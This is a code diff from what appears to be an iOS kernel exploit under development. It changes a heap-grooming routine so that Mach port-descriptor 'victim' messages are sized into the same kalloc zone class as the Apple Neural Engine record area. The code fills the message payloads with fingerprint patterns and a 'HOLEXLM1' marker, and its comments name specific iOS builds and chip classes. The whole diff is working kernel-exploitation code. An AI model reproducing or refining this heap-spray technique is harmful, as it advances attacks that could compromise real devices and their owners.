@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v7-door-diff"
+#define P099_BUILD @"p099-aneprewire-v8-class"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -225,10 +225,20 @@ static uint32_t g_p099_portkindN;  /* dial: last N victims send as portkind (0 =
    kr=0 on 23F77 AND 24A435): MACH_MSG_PORT_DESCRIPTOR + COPY_SEND per
    fresh right; rights released post-send by the kernel send path. */
 #define P099_PK_N_DESC   16u
-#define P099_PK_PAY      0xa80u
+/* v8 CLASS LAW (19:40 door round): the door victims MUST sit in the SAME
+   kalloc magazine as the ANE record area (0x820 class on A14 / the 0x10b8
+   class on T8150) — the 0xB68 victims were in the 0xC00-class magazine and
+   the fill's record stream could not cross their desc blocks. v8 sizes the
+   portkind victim to the LabOff runtime class: kdata_class - 0x24 (msgh). */
+static uint32_t p099_pk_len(void) {
+    uint32_t kdata = 0x820u;
+    const LabOffTab *o99 = LabOff();
+    if (o99 && o99->ane_table_size >= 0x300 && o99->ane_table_size <= 0x4000)
+        kdata = o99->ane_table_size;
+    return kdata - 0x24u;
+}
 static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
-    static const uint32_t PK_LEN = 0x20u + 0x8u /* body pad */
-        + P099_PK_N_DESC * 0xCu + P099_PK_PAY;  /* 0xB60 */
+    const uint32_t PK_LEN = p099_pk_len();  /* 0x7FC on A14 = kdata 0x820 */
     uint8_t *buf = calloc(1, PK_LEN + 1);
     if (!buf) return NO;
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
@@ -246,16 +256,17 @@ static BOOL p099_send_portkind_victim(mach_port_t port, uint32_t index) {
         d->type        = MACH_MSG_PORT_DESCRIPTOR;
     }
     if (made != P099_PK_N_DESC) { free(buf); return NO; }
+    const uint32_t PK_PAY = PK_LEN - 0x20u - 0x8u - P099_PK_N_DESC * 0xCu;
     uint8_t *payload = buf + 0x20u + 0x8u + P099_PK_N_DESC * 0xCu;
     /* same fingerprint pattern as p099_fill_payload, sized for the door msg */
-    for (uint32_t i = 0; i < P099_PK_PAY; i++)
+    for (uint32_t i = 0; i < PK_PAY; i++)
         payload[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^ (uint8_t)(i * 13u));
     uint64_t magic = 0x484F4C45584C4D31ULL;   /* HOLEXLM1 */
     memcpy(payload + 0x00, &magic, 8);
     uint32_t idx = index, role = 1;
     memcpy(payload + 0x08, &idx, 4);
     memcpy(payload + 0x0c, &role, 4);
-    for (uint32_t off = 0x20; off + 8 <= P099_PK_PAY; off += 16)
+    for (uint32_t off = 0x20; off + 8 <= PK_PAY; off += 16)
         memset(payload + off, 0xEE, 8);
     h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
     h->msgh_size = (mach_msg_size_t)PK_LEN;
